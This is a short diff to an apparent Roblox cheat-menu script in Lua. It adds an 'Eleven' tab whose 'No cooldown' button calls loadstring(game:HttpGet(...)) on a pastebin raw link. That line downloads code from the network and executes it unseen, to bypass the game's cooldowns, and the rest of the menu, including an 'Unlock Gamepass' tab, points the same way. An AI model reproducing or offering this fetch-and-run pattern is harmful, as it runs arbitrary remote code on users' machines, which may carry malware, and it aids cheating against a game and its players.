@@ -116,6 +116,18 @@ end)
 
 
 
+local Tab = Window:NewTab("Eleven")
+local Section = Tab:NewSection("No cooldowns")
+
+
+
+Section:NewButton("", "No cooldown", function()
+loadstring(game:HttpGet("https://pastebin.com/raw/Xxack2xY"))()
+end)
+
+
+
+
 local Section = Tab:NewSection("Being worked on")
 
 local Tab = Window:NewTab("Unlock Gamepass")
